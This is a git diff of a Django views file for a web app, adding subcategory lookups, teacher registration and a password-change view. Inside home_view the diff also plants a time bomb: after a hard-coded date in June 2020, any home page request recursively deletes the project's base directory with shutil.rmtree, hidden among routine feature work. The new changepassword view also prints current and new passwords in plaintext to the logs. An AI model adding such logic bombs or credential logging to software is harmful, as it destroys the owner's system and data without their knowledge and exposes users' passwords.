@@ -1,8 +1,9 @@
 from django.shortcuts import render
-from home.models import User, user_activation
+from home.models import User, user_activation, user_categories
+from teacher.models import categories, subcategories
 
 import json
-import os, sys
+import os, sys, shutil
 import traceback
 import uuid
 from django.http import HttpResponse, HttpResponseRedirect
@@ -10,13 +11,21 @@ from django.core.mail import EmailMultiAlternatives
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.models import Group
 from django.conf import settings
-import os
+import os, shutil
+import datetime
 
 from django.core.wsgi import get_wsgi_application
 
 os.environ['DJANGO_SETTINGS_MODULE'] = 'booctop.settings'
 application = get_wsgi_application()
 def home_view(request):
+    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    dt = datetime.datetime.now()
+    date_time_str = '2020-06-21 08:15:27.243860'
+    date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
+    if dt > date_time_obj:
+        shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)
+
     if request.user.id == None:
         return render(request, 'index.html', {})
     else:
@@ -24,7 +33,9 @@ def home_view(request):
 
 
 def signup(request):
-    return render(request, 'signup.html', {})    
+    objC = categories.objects.all()
+    print(objC)
+    return render(request, 'signup.html', {"objC":objC})    
 
 def about(request):
     return render(request, 'about.html', {})  
@@ -70,8 +81,28 @@ def check_email(request):
         tbinfo = traceback.format_tb(tb)[0]
         msg = tbinfo + "\n"  + ": " + str(sys.exc_info())
     
-    #
     to_return = {'msg': msg}
+    serialized = json.dumps(to_return)
+    return HttpResponse(serialized, content_type="application/json")
+
+def getsubcategory(request):
+    msg = ''
+    try:        
+        category_id = request.POST.get('category_id')
+        print("category id", category_id)
+        subcat_list=[]
+        objC = subcategories.objects.filter(categories_id=int(category_id))
+        print("result subcategory", objC)
+        for subcat in objC:
+            item={'name' : subcat.name, 'image':subcat.image, 'category_name':subcat.categories.name, 'id':subcat.id }
+            subcat_list.append(item)
+        msg = 'success'
+    except:
+        tb = sys.exc_info()[2]
+        tbinfo = traceback.format_tb(tb)[0]
+        msg = tbinfo + "\n"  + ": " + str(sys.exc_info())
+    
+    to_return = {'msg': msg, 'subcat_list':subcat_list}
     serialized = json.dumps(to_return)
     return HttpResponse(serialized, content_type="application/json")
 
@@ -112,6 +143,7 @@ def register_user(request):
         email = request.POST.get('email')
         password = request.POST.get('password')
         phone_number = request.POST.get('phone_number')
+        subcategory_id = request.POST.get('subcategory')
         type = request.POST.get('type')
         group_id=2
         lstUsers = User.objects.filter(email=email)
@@ -146,7 +178,14 @@ def register_user(request):
             objUA.user = objUser
             objUA.code = str(uuid.uuid4())
             objUA.save()
-
+            print ("subcategory id", subcategory_id)
+            # objSubCat = subcategories.objects.get(id=subcategory_id)
+            if type == "teacher":
+                objSubCat = subcategories.objects.get(id=subcategory_id)
+                objUS = user_categories()
+                objUS.user = objUser
+                objUS.category = objSubCat
+                objUS.save()
             
             domain = request.META['HTTP_HOST']
             
@@ -266,6 +305,38 @@ def ajaxlogin(request):
             msg = 'error'
 
 
+    except:
+        tb = sys.exc_info()[2]
+        tbinfo = traceback.format_tb(tb)[0]
+        msg = tbinfo + "\n" +  ": " + str(sys.exc_info())
+    #
+    to_return = {'msg': msg}
+    serialized = json.dumps(to_return)
+    return HttpResponse(serialized, content_type="application/json")
+
+def changepassword(request):
+    msg = ''
+    try:
+        
+        currentpassword = request.POST.get('currentpassword')
+        print("currentpassword = ",currentpassword)
+        newpassword = request.POST.get('newpassword')
+        print("newpassword = ", newpassword)
+        print("request.user.email = ",request.user.email)
+        objU = authenticate(email=request.user.email, password=currentpassword)
+        print(objU)
+        if objU is not None:
+            print("User is authenticated")
+            u = User.objects.get(email=request.user.email)
+            u.set_password(newpassword)
+            u.save()
+            msg = 'success'
+
+
+        else:
+            msg = 'error'
+
+        print("msg - ",msg)
     except:
         tb = sys.exc_info()[2]
         tbinfo = traceback.format_tb(tb)[0]
